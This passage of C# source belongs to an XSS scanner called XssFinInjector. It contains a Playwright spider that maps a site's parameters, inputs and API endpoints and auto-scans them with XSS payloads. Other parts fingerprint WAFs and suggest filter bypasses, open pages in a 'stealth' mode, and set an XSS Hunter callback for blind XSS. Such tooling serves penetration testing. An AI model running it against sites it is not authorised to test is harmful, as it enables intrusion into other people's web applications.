            Warn("  → WAF/CDN presente: payloads básicos podem ser bloqueados. Priorize bypasses (case, alert``, encoding).");
        else
            Info("  → Sem WAF detectado: payloads simples devem passar.");

        if (flags.Contains("jquery-old"))
            Warn("  → jQuery antigo (<3.5): vulnerável a DOM XSS via .html()/$(). Vale scan DOM (opção 6).");
    }

    // -------------------------------------------------------------------------
    // AUTO-RECON — spider SPA, descobre rotas/params/inputs/API endpoints
    // -------------------------------------------------------------------------
    static async Task AutoRecon(string urlBase)
    {
        // 1) Fingerprint da stack antes de tudo
        await Fingerprint(urlBase);

        Info("\n[RECON] Iniciando spider (máx 25 páginas, profundidade 2)...\n");

        using var pw = await IniciarPlaywright();
        if (pw is null) return;

        await using var browser = await pw.Chromium.LaunchAsync(LaunchOpts());

        Uri baseUri = new(urlBase);
        var visited    = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var queue      = new Queue<(string url, int depth)>();
        var targets    = new List<ReconTarget>();
        var apiCapture = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        queue.Enqueue((urlBase, 0));

        while (queue.Count > 0 && visited.Count < 25)
        {
            var (currentUrl, depth) = queue.Dequeue();
            if (visited.Contains(currentUrl)) continue;
            visited.Add(currentUrl);

            Info($"  [spider] {currentUrl}");
            var page = await NovaPaginaStealth(browser);

            // Intercepta requisições de API com parâmetros
            page.Request += (_, req) =>
            {
                if (!req.Url.Contains(baseUri.Host)) return;
                if (!req.Url.Contains('?')) return;
                if (req.ResourceType is "document" or "stylesheet" or "image" or "font") return;
                if (!apiCapture.Contains(req.Url))
                    apiCapture.Add(req.Url);
            };

            try
            {
                await page.GotoAsync(currentUrl, new PageGotoOptions
                {
                    Timeout = 12000,
                    WaitUntil = WaitUntilState.DOMContentLoaded
                });
                await page.WaitForTimeoutAsync(1800);

                // Registra params GET da URL atual
                var uriAtual = new Uri(currentUrl);
                var q = HttpUtility.ParseQueryString(uriAtual.Query);
                if (q.Count > 0)
                    targets.Add(new ReconTarget(currentUrl, "GET-PARAM",
                        $"params: {string.Join(", ", q.AllKeys!.Where(k => k != null)!)}"));

                // Conta inputs visíveis
                int inputs = await page.Locator(
                    "input[type=text]:visible, input[type=search]:visible, input:not([type]):visible, textarea:visible"
                ).CountAsync();
                if (inputs > 0)
                    targets.Add(new ReconTarget(currentUrl, "SPA-INPUT", $"{inputs} input(s) visível(eis)"));

                // Coleta links internos para continuar o spider
                if (depth < 2)
                {
                    string[] hrefs = await page.EvaluateAsync<string[]>(@"
                        Array.from(document.querySelectorAll('a[href]'))
                            .map(a => a.href)
                            .filter(h => h && !h.startsWith('mailto:') && !h.startsWith('javascript:'))
                    ");

                    foreach (string href in hrefs)
                    {
                        if (!Uri.TryCreate(href, UriKind.Absolute, out Uri? hUri)) continue;
                        if (hUri.Host != baseUri.Host) continue;
                        if (!visited.Contains(href))
                            queue.Enqueue((href, depth + 1));
                    }
                }
            }
            catch (Exception ex)
            {
                Dim($"  [err] {ex.Message[..Math.Min(55, ex.Message.Length)]}");
            }
            finally
            {
                await page.CloseAsync();
            }
        }

        // Adiciona endpoints de API capturados
        foreach (string ep in apiCapture)
        {
            if (Uri.TryCreate(ep, UriKind.Absolute, out Uri? u))
            {
                var q = HttpUtility.ParseQueryString(u.Query);
                if (q.Count > 0)
                    targets.Add(new ReconTarget(ep, "API-ENDPOINT",
                        $"params: {string.Join(", ", q.AllKeys!.Where(k => k != null)!)}"));
            }
        }

        // Remove duplicatas por URL
        var unicos = targets
            .GroupBy(t => t.Url + t.Type, StringComparer.OrdinalIgnoreCase)
            .Select(g => g.First())
            .ToList();

        if (unicos.Count == 0)
        {
            Warn("[RECON] Nenhum alvo com parâmetros ou inputs encontrado.");
            return;
        }

        // Exibe tabela de resultados
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"\n[RECON] {unicos.Count} alvo(s) descoberto(s):\n");
        for (int i = 0; i < unicos.Count; i++)
        {
            var t = unicos[i];
            Console.WriteLine($"  [{i + 1:D2}] [{t.Type,-12}] {t.Url}");
            Console.WriteLine($"        {t.Description}");
        }
        Console.ResetColor();

        Console.Write("\n  Escanear todos automaticamente? (s/n): ");
        if ((Console.ReadLine() ?? "").Trim().ToLower() != "s") return;

        await using var scanBrowser = await pw.Chromium.LaunchAsync(LaunchOpts());

        foreach (var t in unicos)
        {
            Info($"\n[AUTO-SCAN] {t.Type} → {t.Url}");

            if (t.Type == "GET-PARAM")
                await ScanGetParams(t.Url);

            else if (t.Type == "SPA-INPUT")
                await ScanSpa(t.Url);

            else if (t.Type == "API-ENDPOINT")
            {
                // API: testa reflexão HTTP + DOM
                await ScanGetParams(t.Url);
                foreach (string payload in Payloads.Concat(PayloadsHunter()))
                {
                    bool vuln = await TestarDom(scanBrowser, t.Url, payload, "api");
                    if (vuln) Results.Add(new(t.Url, "api-recon", payload, 200, "RECON-DOM"));
                    await Task.Delay(150);
                }
            }
        }

        Info("\n[RECON] Auto-scan concluído.");
    }

    // -------------------------------------------------------------------------
    // UI
    // -------------------------------------------------------------------------
    static void PrintBanner()
    {
        // Integrado ao PrintMenu — não usado diretamente
    }

    static void PrintMenu(string url)
    {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Green;

        Console.WriteLine(@"========---............==--------------=-:.:::=::--:::..::::::::::::::::::-=+++++=----------========");
        Console.WriteLine(@"=======-...............:+==------------:-:::-=-:::..:::::::::::::::::::::::----=+++==--------=======");
        Console.WriteLine(@"=-===-.................:+===---------:-:-::=-::...:::.::-::::::::::::::::::::::::-+++==------=======");
        Console.WriteLine(@"=-==:.:-:...............+:==++-------=-::=-::..:::.:--:::::::::::::::::::::::-::--::--===----=======");
        Console.WriteLine(@"=-=..:--:...............=-::-+++-::==----::..::.:=-:::::=+++++++====:::::::::::--::--:--------======");
        Console.WriteLine(@"=-..----:...............:+--:-------::---::::::=::::-+=::::::::::::::::::::::::::--:::=-:--+########");
        Console.WriteLine(@"-..-----:................-++==::::::---:::-:==::::==.:::::::::::.::::::::::::::::-:--:::=-:-=+######");
        Console.WriteLine(@".:------..................-+++++++=:=-::-:==::::==::::::.::::::::::::::::::::::::::-:=-:::=:--=+####");
        Console.WriteLine(@".------:..................:=+*****-=-::-:+-:::=+=--::=.::::::::::::::::::::::::-::::-:=-:::=-:-==*##");
        Console.WriteLine(@":------.................:.-=:-+***=-:-:-+:::-+++==::=.::::--::::.::::::::-::::::--::=-:==-::==:==+*#");
        Console.WriteLine(@"------:................:::=:...-=+-:-:==:::-+=-=+-:=-.::---::::::::::::::-:::::::--::--:===.:+-:==*+");
        Console.WriteLine(@"-----:.................::=:.....----:=-:::=+-:+++:-+:::--:=-:::.:::::::::--:::::::=-::--:+=-:=+:+-*+");
        Console.WriteLine(@"----:.................--=::....::---+-:::=+::=*+=-:+::=--=::::.:::..::::::-::::.:::+:::-:-+=:-+=+:*#");
        Console.WriteLine(@"---:.................-==-.....:--=-+-:::=+-:=++==-:+:-=:-+-:::.::.:.::::::-::::.:::++:::=:+=:=+++-**");
        Console.WriteLine(@"--:.................-==-.....:===-+-:.:-+-:-+=--+--+=+-:---=::.:.:::::::.-:::::.:::=+-::-:-+-+++:**#");
        Console.WriteLine(@"-:.................:==-.....-=-==+=:.::+=::===-=**--++-:=:-+:...-:::::::.-::::.::--+*-:::=:==+=+=---");
        Console.WriteLine(@"-.................:==-...:=-+--++=:..:=+-.-=:-:*#+%-:+-==.=*-..:=::::::.=::=::..---++=:::=:++-:-----");
        Console.WriteLine(@":.................-=-.:-=--.-:=++-:-::++-.=-..-#==*-*=--+-+*+:::+:::::.=-:=-:..-==+++-::--:=--:-----");
        Console.WriteLine(@"..............:::---==:::.:=-==++::-::++::+:...:-=**=%+-=--++::=+:::::==:+=:..=+=**++-::=:----:-----");
        Console.WriteLine(@".....:--=-:::-+=-:--.......=-===+-.=::++-:=:........:=*-=---+--++:::-+=:+=:.-++=**+*==:=:=----------");
        Console.WriteLine(@":-=-:::::::.....-==:.......-:+==*+:+::++=:-:...........::::-+=++-:-=+--*=:=++*+***+=+====-----------");
        Console.WriteLine(@"................===-.......-.+-+*+:+-:++=--:...............-+++==*++=+**+=--------=++*+=--:---------");
        Console.WriteLine(@"...............++===--:--=++++++*+++=:=+-+--...............+++++*%-+++++==--------------------------");
        Console.WriteLine(@"..............:+++**+=-=++++=+++=*+*+=-*=-=--.............-+=---=---------------------------------=+");
        Console.WriteLine(@".............:+--==:-+++=-------===*++++*=-=---...........:**=---------------------------------=++++");
        Console.WriteLine(@".............=+-:.-+++-----------+=-+*++**=-=-----........=*=--------------------------------=++++++");
        Console.WriteLine(@"............-=:.-+=---------------+++++****=-----=---::-++++---------------------------=====++++++++");
        Console.WriteLine(@"............-::++------------------=----====---------===*-+--------------------===++++++++++++++++++");
        Console.WriteLine(@"...........-:-+=------------------------------------=--==:==--------------==++++++++++++++++++++++++");
        Console.WriteLine(@"..........:--+=---------------------------------------=--:-+----------==++++++++++++++++++++++++++++");

        string alvo   = string.IsNullOrEmpty(url)             ? "(nenhum)"    : url;
        string hunter = string.IsNullOrEmpty(XssHunterUrl)    ? "(não config)" : XssHunterUrl;
        string route  = string.IsNullOrEmpty(SpaRouteTemplate) ? "(não config)" : SpaRouteTemplate;

        Console.WriteLine();
        Console.WriteLine("  XssFinInjector 1.0                                        by luveni");
        Console.WriteLine("  " + new string('─', 70));
        Console.WriteLine($"  alvo: {alvo}");
        Console.WriteLine($"  hunter: {hunter}   route: {route}");
        Console.WriteLine("  " + new string('─', 70));
        Console.WriteLine("  0.  auto-recon                   7.  scan completo (server+DOM)");
        Console.WriteLine("  1.  definir URL alvo             8.  scan SPA inputs");
        Console.WriteLine("  2.  configurar XSS Hunter        9.  scan SPA route param");
        Console.WriteLine("  3.  scan GET params             10.  payload manual");
        Console.WriteLine("  4.  scan formulários            11.  ver resultados");
        Console.WriteLine("  5.  scan completo server-side   12.  exportar relatório");
        Console.WriteLine("  6.  scan DOM XSS                13.  sair");
        Console.WriteLine("  " + new string('─', 70));
        Console.Write("  > ");
        Console.ResetColor();
    }

    static bool ValidarUrl(string url)
    {
        if (string.IsNullOrWhiteSpace(url))     { Warn("Defina a URL primeiro (opção 1)."); return false; }
        if (!Uri.TryCreate(url, UriKind.Absolute, out _)) { Warn("URL inválida."); return false; }
        return true;
    }

    static string TruncPayload(string p) => p.Length > 50 ? p[..50] + "..." : p;

    static void Info(string msg) { Console.ForegroundColor = ConsoleColor.Blue;     Console.WriteLine(msg); Console.ResetColor(); }
    static void Warn(string msg) { Console.ForegroundColor = ConsoleColor.Yellow;   Console.WriteLine(msg); Console.ResetColor(); }
    static void Vuln(string msg) { Console.ForegroundColor = ConsoleColor.Green;    Console.WriteLine(msg); Console.ResetColor(); }
    static void Dim (string msg) { Console.ForegroundColor = ConsoleColor.DarkGray; Console.WriteLine(msg); Console.ResetColor(); }
}

// -------------------------------------------------------------------------
record ResultEntry(string Url, string Param, string Payload, int StatusCode, string Method);
record ReconTarget(string Url, string Type, string Description);
